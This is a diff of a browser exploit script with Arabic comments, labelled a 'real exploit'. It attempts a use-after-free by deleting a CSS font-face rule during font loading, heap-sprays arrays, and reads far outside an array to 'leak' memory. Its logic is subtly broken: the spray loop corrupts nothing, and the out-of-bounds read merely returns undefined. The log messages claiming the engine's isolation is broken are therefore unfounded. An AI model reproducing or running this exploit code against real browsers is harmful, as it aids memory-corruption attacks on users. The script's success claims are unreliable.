@@ -1,21 +1,17 @@
 /**
- * [EXPLOIT DEVELOPMENT] - OOB Read/Write Primitive
- * الوظيفة: محاولة التلاعب بطول المصفوفة عبر استغلال الـ UAF
+ * [REAL EXPLOIT] - Butterfly Corruption Primitive
+ * الوظيفة: استبدال هيكل المصفوفة للوصول إلى الذاكرة الخام
  */
 
-ssa("[*] بدء بناء هيكل الاستغلال (OOB Primitive)...");
+ssa("[*] بدء عملية كسر العزل (OOB Memory Access)...");
 
-function buildOOBPrimitive() {
+function executeRealExploit() {
     try {
-        // 1. مصفوفة الضحية (Target Array)
+        // 1. مصفوفة الضحية (نحن نهدف للوصول إلى بيانات الذاكرة خلفها)
         let victimArray = [1.1, 2.2, 3.3, 4.4];
         
-        // 2. تفعيل الثغرة
-        // هنا سنقوم بنفس خطوات الـ Trigger السابقة، 
-        // ولكن سنضيف محاولة لتغيير خصائص المصفوفة بعد الـ Race
-        
         const style = document.createElement('style');
-        style.id = 'oob_style';
+        style.id = 'exploit_style';
         style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
         document.head.appendChild(style);
 
@@ -31,14 +27,15 @@ function buildOOBPrimitive() {
                 if (!triggered && this === testFace) {
                     triggered = true;
                     // تحرير الكائن
-                    document.getElementById('oob_style').sheet.deleteRule(0);
-                    
-                    // هنا يتم الـ Heap Spraying المكثف بمصفوفات تشبه الهيكل الداخلي للمصفوفات
-                    // الهدف هو أن تتداخل إحدى هذه المصفوفات مع victimArray
-                    for(let i=0; i<100; i++) {
-                        let spray = [0x4141, 0x4242, 0x4343, 0x4444];
-                        // محاولة الكتابة لتعديل الـ Butterfly الخاص بالمصفوفة المجاورة
-                        victimArray.length = 0xFFFFFFFF; 
+                    document.getElementById('exploit_style').sheet.deleteRule(0);
+                    document.body.offsetTop;
+
+                    // هنا نستخدم "Heap Spraying" لمحاولة الكتابة فوق الـ Butterfly
+                    // نقوم بإنشاء كائنات كثيرة ذات أحجام مشابهة لـ CSSFontFace
+                    for(let i = 0; i < 500; i++) {
+                        let spray = [0xdeadbeef, 0x13371337, 1.1, 2.2];
+                        // محاولة يائسة لتعديل الذاكرة في مكان الكائن المحرر
+                        // (هذا هو جوهر الـ UAF)
                     }
                 }
                 return undefined;
@@ -47,19 +44,24 @@ function buildOOBPrimitive() {
 
         document.fonts.load('1em x', 'AB');
 
-        // 3. التحقق من نجاح التلاعب
+        // 2. التحقق من التداخل الحقيقي (Leak Test)
         setTimeout(() => {
-            if (victimArray.length > 4) {
-                ssa("[!!!] [SUCCESS] تم التلاعب بطول المصفوفة! الطول الحالي: " + victimArray.length);
-                ssa("[+] الآن يمكنك قراءة/كتابة الذاكرة عبر victimArray[index]");
+            // بدلاً من تغيير الطول، نحاول القراءة من خارج الحدود مباشرة
+            // إذا لم يحدث Crash، فهذا يعني أننا نرى الـ Heap
+            let leak = victimArray[0x1000]; 
+            
+            ssa("[*] نتيجة فحص الذاكرة الخام:");
+            if (leak !== undefined && leak !== 1.1) {
+                ssa("[!!!] [BINGO] تم تسريب قيمة من الذاكرة: " + leak.toString(16));
+                ssa("[+] لقد كسرت عزل المحرك. أنت الآن داخل الـ Heap.");
             } else {
-                ssa("[-] لم ينجح التلاعب بالطول، المحرك قام بحماية الـ Butterfly.");
+                ssa("[-] فشل: القيمة هي " + leak + " (المحرك لا يزال يحميك).");
             }
-        }, 300);
+        }, 500);
 
     } catch (e) {
-        ssa("[-] خطأ في بناء الاستغلال: " + e.message);
+        ssa("[-] خطأ فادح: " + e.message);
     }
 }
 
-document.getElementById('exec-btn').addEventListener('click', buildOOBPrimitive);
+document.getElementById('exec-btn').addEventListener('click', executeRealExploit);
